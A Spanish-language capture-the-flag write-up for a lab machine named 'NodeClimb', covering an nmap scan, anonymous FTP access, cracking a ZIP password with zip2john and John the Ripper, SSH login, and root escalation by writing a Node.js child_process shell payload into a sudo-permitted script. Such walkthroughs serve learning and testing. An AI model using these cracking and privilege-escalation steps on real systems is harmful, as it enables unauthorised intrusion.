# NodeClimb
## 1. Reconocimiento de Puertos con Nmap

Iniciamos la auditoría con un escaneo de puertos y servicios para perfilar la máquina objetivo.

```Bash
nmap -sC -sV -O <IP_DEL_OBJETIVO>
```

**Resultados:**

|**Puerto**|**Estado**|**Servicio**|**Versión**|
|---|---|---|---|
|**21/tcp**|Open|ftp|vsftpd 3.0.3|
|**22/tcp**|Open|ssh|OpenSSH 9.2p1 Debian|

**Análisis de Vulnerabilidades Iniciales:**

El script por defecto de nmap revela que el servidor FTP en el puerto 21 permite el **inicio de sesión anónimo** (`Anonymous FTP login allowed`). Además, se lista un archivo comprimido llamado `secretitopicaron.zip` en el directorio raíz, lo que nos marca el vector de entrada inicial.

## 2. Enumeración y Exfiltración FTP

Nos conectamos al servicio FTP utilizando las credenciales anónimas.

```Bash
ftp <IP_DEL_OBJETIVO>
# Name: anonymous
# Password: (vacío)
```

Una vez dentro, listamos el contenido, confirmamos la existencia del archivo comprimido y lo exfiltramos a nuestra máquina local para su análisis.

```Bash
ftp> ls
# -rw-r--r--    1 0        0             242 Jul 05  2024 secretitopicaron.zip
ftp> get secretitopicaron.zip
ftp> exit
```

## 3. Cracking y Obtención de Credenciales

Al intentar descomprimir el archivo descargado, el sistema nos solicita una contraseña.

```Bash
unzip secretitopicaron.zip
# Archive:  secretitopicaron.zip
# [secretitopicaron.zip] password.txt password: 
```

### 3.1. Extracción del Hash (zip2john)

Para romper la seguridad del archivo ZIP, primero extraemos su hash criptográfico utilizando la utilidad `zip2john`.

```Bash
zip2john secretitopicaron.zip > zip_hash.txt
```

### 3.2. Ataque de Fuerza Bruta (John the Ripper)

Utilizamos `john` para realizar un ataque por diccionario contra el hash extraído.

```Bash
john zip_hash.txt --wordlist=/usr/share/wordlists/rockyou.txt
```

**Resultado:** La herramienta logra romper el hash rápidamente, revelando la contraseña del archivo ZIP: password1.

### 3.3. Extracción de Credenciales

Con la contraseña, descomprimimos el archivo y leemos su contenido.

```Bash
unzip secretitopicaron.zip
# Password: password1
cat password.txt
```

**Contenido revelado:**

> `mario:laKontraseñAmasmalotaHdelbarrioH`

Hemos obtenido un conjunto válido de credenciales.

## 4. Acceso Inicial (SSH)

Contando con credenciales válidas y sabiendo que el puerto 22 está abierto, procedemos a autenticarnos directamente vía SSH (descartando el FTP autenticado ya que el acceso a consola es mucho más valioso y directo).

```Bash
ssh mario@<IP_DEL_OBJETIVO>
# Password: laKontraseñAmasmalotaHdelbarrioH
```

Verificamos el acceso exitoso:

```Bash
whoami
# mario
```

## 5. Escalada de Privilegios

El objetivo ahora es comprometer la cuenta de superusuario (`root`).

### 5.1. Enumeración de Sudoers

Revisamos los privilegios administrativos asignados al usuario `mario`.

```Bash
sudo -l
```

**Salida:**

```
User mario may run the following commands on nodeclimb:
    (ALL) NOPASSWD: /usr/bin/node /home/mario/script.js
```

El usuario puede ejecutar el entorno de ejecución `node` (Node.js) con privilegios de `root` sin contraseña, pero solo si ejecuta el archivo `/home/mario/script.js`.

### 5.2. Explotación de Node.js (Child Process)

Revisamos el archivo `script.js` y comprobamos que está vacío, pero tenemos permisos de escritura sobre él. Podemos inyectar código JavaScript para generar un proceso secundario (`child_process`) que invoque una shell interactiva.

Editamos el archivo:

```Bash
nano /home/mario/script.js
```

**Payload JavaScript:**

```JavaScript
require('child_process').spawn('/bin/sh', {stdio: [0, 1, 2]});
```

> [!Note] Explicación técnica: 
> Este payload importa el módulo `child_process` y utiliza la función `spawn` para ejecutar `/bin/sh`. El array `stdio: [0, 1, 2]` enlaza la entrada estándar (stdin), salida estándar (stdout) y error estándar (stderr) del proceso hijo con nuestra terminal actual, permitiéndonos interactuar con la shell._

### 5.3. Obtención de Root

Ejecutamos el script modificado utilizando los privilegios concedidos en `sudoers`.

```Bash
sudo /usr/bin/node /home/mario/script.js
```

La shell se genera con los privilegios heredados de `sudo`.

```Bash
whoami
# root
```
